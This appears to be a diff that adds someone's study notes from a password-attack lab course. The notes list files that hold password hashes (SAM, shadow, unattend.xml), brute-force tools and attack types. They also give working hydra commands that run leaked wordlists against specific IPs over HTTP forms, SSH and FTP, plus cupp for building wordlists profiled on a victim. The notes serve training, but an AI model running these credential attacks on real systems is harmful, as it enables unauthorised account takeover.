@@ -1,0 +1,88 @@
+Here is a small list of files that can contain hashed passwords:
+
+| windows:       |  Linux" 
+| -unattend.xml  |  -shadow
+| -sysprep.inf   |  -shadow.bak
+| -SAM           |  -password
+------------------------------
+
+=============================================
+
+Brute forcing tools:
+-Ncrack
+-wfuzz
+-medusa
+-patator
+-hydra
+-and others.
+============================================
+
+Brute forcing categories:
+-Brute forcing basic HTTP auth
+-Brute force for default passwords
+-Brute forcing login forms
+-Brute force usernames
+-Creating personalized username and password wordlists based on our target
+-Brute forcing service logins, such as FTP and SSH
+
+============================================
+
+Password Attack Type:
+
+-Dictionary attack
+-Brute force
+-Traffic interception
+-Man In the Middle
+-Key Logging
+-Social engineering
+
+============================================
+
+There are many methodologies to carry a Login Brute Force attacks:
+
+Attack	Description
+Online Brute Force Attack	Attacking a live application over the network, like HTTP, HTTPs, SSH, FTP, and others
+Offline Brute Force Attack	Also known as Offline Password Cracking, where you attempt to crack a hash of an encrypted password.
+Reverse Brute Force Attack	Also known as username brute-forcing, where you try a single common password with a list of usernames on a certain service.
+Hybrid Brute Force Attack	Attacking a user by creating a customized password wordlist, built using known intelligence about the user or the service.
+
+============================================
+
+hydra parmeteres:
+
+-C COMBINED VREDENTIALS WORDLIST
+
+server_ip ======> target ip
+-s =============> target por
+http-get =======> request method
+/ ==============> target path
+
+=============================================
+hydra -C /home/l4b/Downloads/seclistsIMPROVED/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 165.232.46.252 -s 32307 http-get /
+==========================
+hydra -l admin -P /home/l4b/Downloads/seclistsIMPROVED/Passwords/Leaked-Databases/rockyou-10.txt -f 159.65.60.16 -s 32485 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+===========================
+hydra -l b.gates -P william.txt -u -f ssh://159.65.60.16:32518 -t 4
+===========================
+cupp -i
+===========================
+hydra -l b.gates -P rockyou-55.txt ftp://165.232.46.252:31279
+===========================
+hydra -l b.gates -P rockyou-25.txt ftp://0.0.0.0
+===========================
+hydra -C /home/l4b/Downloads/seclistsIMPROVED/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 209.97.176.220 -s 30993 http-get /
+===========================
+sudo hydra -L /home/l4b/Downloads/seclistsIMPROVED/Usernames/Names/names.txt -P /home/l4b/Downloads/seclistsIMPROVED/Passwords/Leaked-Databases/rockyou.txt 209.97.176.220 -s 30993 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
+===========================
+Welcome back Mr. Harry Potter!
+Please change your password, as it is very weak!
+You password must meet the company's Password Policy:
+Must be 8 characters or longer
+Must contain numbers
+Must contain special characters
+===========================
+A name of an employee can be found inside the admin panel of the previous skills assessment exercise. To reduce the length of the wordlist, don't input too much information about the victim. Start with only their first name, and if you don't get a hit, then start adding information gradually to build bigger wordlists.
+===========================
+Use the wordlist provided in your home directory.
+===========================
+cupp -i
